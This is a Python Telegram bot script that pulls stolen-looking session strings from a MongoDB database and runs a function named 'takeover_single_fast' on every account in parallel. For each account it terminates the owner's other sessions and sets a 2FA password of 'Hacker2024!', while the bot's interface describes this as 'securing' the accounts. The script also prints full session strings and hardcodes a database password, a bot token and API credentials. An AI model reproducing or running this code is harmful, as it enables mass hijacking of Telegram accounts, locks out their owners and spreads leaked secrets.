import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.auth import ResetAuthorizationsRequest
import os
from concurrent.futures import ThreadPoolExecutor

# Force install correct telethon version
import subprocess
import sys
try:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon==1.28.5"])
except:
    pass

# Config
MONGO_URI = "mongodb+srv://pokemon_bot_user:PokemonBot2024!Secure@cluster0pokemon-bot-clu.iveqoue.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0pokemon-bot-cluster"
DB_NAME = "pokemon_guess_bot"
ACCOUNTS_COLL = "Accounts"
API_ID = 29288199
API_HASH = "9ff308629870e029601d2ee667821506"
BOT_TOKEN = "8275817464:AAGnjwnKXvJ9NrTNE4SEnsZAHs1gm1bLDP8"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class FastAccountManager:
    def __init__(self):
        self.mongo = MongoClient(MONGO_URI)
        self.db = self.mongo[DB_NAME]
        self.accounts = self.db[ACCOUNTS_COLL]
        self.executor = ThreadPoolExecutor(max_workers=10)
    
    def get_all_accounts(self):
        return list(self.accounts.find({}))
    
    async def takeover_single_fast(self, identifier, session_string, password="Hacker2024!"):
        """Fast account takeover - NO SAVED MESSAGES"""
        try:
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.start()
            
            if await client.is_user_authorized():
                # Get account info
                me = await client.get_me()
                
                try:
                    # Terminate sessions
                    await client(ResetAuthorizationsRequest())
                    sessions_terminated = True
                except Exception as e:
                    if "too new" in str(e):
                        sessions_terminated = False  # Session too new
                    else:
                        sessions_terminated = False
                
                # SIMPLE 2FA enable - NO SAVED MESSAGES
                try:
                    await client.edit_2fa(new_password=password)
                    result_msg = f"✅ {identifier} secured! 2FA enabled"
                except Exception as e:
                    if "PASSWORD_HASH_INVALID" in str(e) or "already" in str(e):
                        result_msg = f"✅ {identifier} secured! (2FA already enabled)"
                    else:
                        result_msg = f"✅ {identifier} secured! (2FA failed: {str(e)})"
                
                # NO SAVED MESSAGES - REMOVED CONFIRMATION MESSAGE
                
                await client.disconnect()
                return True, f"{result_msg}\nReal phone: {me.phone}\nPassword: {password}"
            else:
                await client.disconnect()
                return False, f"❌ {identifier} - Invalid session"
                
        except Exception as e:
            return False, f"❌ {identifier} - {str(e)}"
    
    async def test_single_fast(self, session_string):
        """Fast session test"""
        try:
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.start()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                await client.disconnect()
                return True, f"✅ {me.phone} - {me.first_name}"
            else:
                await client.disconnect()
                return False, "❌ Invalid session"
        except Exception as e:
            return False, f"❌ {str(e)}"

manager = FastAccountManager()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📋 List Accounts", callback_data="list")],
        [InlineKeyboardButton("🚀 Secure All Accounts", callback_data="secure_all")],
        [InlineKeyboardButton("⚡ Quick Test", callback_data="quick_test")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 SECURE Account Manager\n\n"
        "Commands:\n"
        "/accounts - Show all accounts\n"
        "/secure_all - Terminate sessions + Set 2FA\n" 
        "/quick_test - Test sessions\n",
        reply_markup=reply_markup
    )

async def accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """FAST accounts listing with full session strings"""
    accounts = manager.get_all_accounts()
    
    if not accounts:
        await update.message.reply_text("❌ No accounts found")
        return
    
    # Send accounts in batches for speed
    batch_size = 5
    total_batches = (len(accounts) + batch_size - 1) // batch_size
    
    for batch_num in range(total_batches):
        start_idx = batch_num * batch_size
        end_idx = start_idx + batch_size
        batch = accounts[start_idx:end_idx]
        
        response = f"📋 Accounts (Batch {batch_num + 1}/{total_batches}):\n\n"
        
        for i, acc in enumerate(batch, start_idx + 1):
            phone = acc.get('phone_number', 'N/A')
            session = acc.get('session_string', 'No session')
            status = acc.get('status', 'unknown')
            
            response += f"**{i}. {phone}**\n"
            response += f"🔐 **Session:** `{session}`\n"
            response += f"📊 **Status:** {status}\n"
            response += "─" * 40 + "\n\n"
        
        await update.message.reply_text(response, parse_mode='Markdown')
    
    await update.message.reply_text(f"✅ Showing {len(accounts)} accounts total")

async def secure_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SECURE all accounts - Terminate sessions + 2FA"""
    await update.message.reply_text("🚀 Securing ALL accounts...\n\n🔴 Terminating all sessions\n🔐 Setting 2FA: Hacker2024!")
    
    accounts = manager.get_all_accounts()
    tasks = []
    password = "Hacker2024!"  # STRONG PASSWORD
    
    # Create tasks for all accounts
    for i, acc in enumerate(accounts):
        session = acc.get('session_string')
        if session:
            identifier = f"Account_{i+1}"
            task = manager.takeover_single_fast(identifier, session, password)
            tasks.append(task)
    
    # Run all tasks in parallel
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results
    success_count = 0
    response = "📊 SECURE Results:\n\n"
    
    for i, (success, message) in enumerate(results):
        if success:
            success_count += 1
            response += f"✅ {message}\n"
        else:
            response += f"❌ {message}\n"
        
        # Send batch every 10 results
        if (i + 1) % 10 == 0:
            await update.message.reply_text(response)
            response = ""
    
    if response:
        await update.message.reply_text(response)
    
    await update.message.reply_text(f"🎯 SECURE COMPLETE: {success_count}/{len(accounts)} accounts secured!\n🔑 Password: Hacker2024!")

async def quick_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """FAST session testing"""
    await update.message.reply_text("⚡ Testing sessions FAST...")
    
    accounts = manager.get_all_accounts()
    tasks = []
    
    # Test first 10 accounts for speed
    test_accounts = accounts[:10]
    
    for acc in test_accounts:
        session = acc.get('session_string')
        if session:
            task = manager.test_single_fast(session)
            tasks.append(task)
    
    # Run tests in parallel
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    response = "⚡ Quick Test Results (First 10):\n\n"
    valid_count = 0
    
    for success, message in results:
        if success:
            valid_count += 1
            response += f"✅ {message}\n"
        else:
            response += f"❌ {message}\n"
    
    response += f"\n📊 Valid: {valid_count}/{len(test_accounts)}"
    await update.message.reply_text(response)

async def test_all_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test ALL sessions"""
    await update.message.reply_text("🔍 Testing ALL sessions...")
    
    accounts = manager.get_all_accounts()
    tasks = []
    
    for i, acc in enumerate(accounts):
        session = acc.get('session_string')
        if session:
            identifier = f"Account_{i+1}"
            task = manager.test_single_fast(session)
            tasks.append((identifier, task))
    
    # Run tests in parallel
    results = await asyncio.gather(*[task for _, task in tasks], return_exceptions=True)
    
    response = "🔍 All Session Test Results:\n\n"
    valid_count = 0
    
    for (identifier, _), (success, message) in zip(tasks, results):
        if success:
            valid_count += 1
            response += f"✅ {identifier}: {message}\n"
        else:
            response += f"❌ {identifier}: {message}\n"
        
        # Send batch every 15 results
        if (valid_count + 1) % 15 == 0:
            await update.message.reply_text(response)
            response = ""
    
    if response:
        await update.message.reply_text(response)
    
    await update.message.reply_text(f"📊 TOTAL: {valid_count}/{len(accounts)} valid sessions")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "list":
        await accounts(query, context)
    elif query.data == "secure_all":
        await secure_all(query, context)
    elif query.data == "quick_test":
        await quick_test(query, context)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("accounts", accounts))
    application.add_handler(CommandHandler("secure_all", secure_all))
    application.add_handler(CommandHandler("quick_test", quick_test))
    application.add_handler(CommandHandler("test_all", test_all_sessions))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info("🔒 SECURE Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
